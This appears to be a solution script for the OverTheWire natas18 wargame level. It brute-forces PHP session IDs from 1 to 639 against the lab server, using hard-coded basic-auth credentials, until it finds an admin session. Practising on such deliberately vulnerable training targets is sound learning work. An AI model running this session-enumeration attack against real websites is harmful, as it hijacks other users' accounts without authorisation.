import requests
from requests.auth import HTTPBasicAuth
from requests_toolbelt.utils import dump
URL = "http://natas18.natas.labs.overthewire.org/index.php"

for i in range(1, 640):
    COOKIES = {'PHPSESSID': str(i)}
    r = requests.get(url = URL, auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies = COOKIES)
    print(i)
    #Put the counter just to know that some progress is happening.
    if "You are an admin." in r.text:
        print(r.text)
        break





